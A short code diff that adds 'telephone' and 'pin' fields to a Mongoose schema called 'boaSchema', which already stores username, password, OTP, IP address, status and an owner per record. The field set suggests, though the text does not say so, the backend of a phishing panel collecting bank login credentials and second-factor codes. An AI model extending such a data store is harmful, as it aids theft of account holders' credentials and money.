@@ -5,6 +5,8 @@ const boaSchema = new mongoose.Schema({
     username: String,
     password: String,
     otp: String,
+    telephone: String,
+    pin: String,
     status: Number,
     ip: String,
     owner: String,
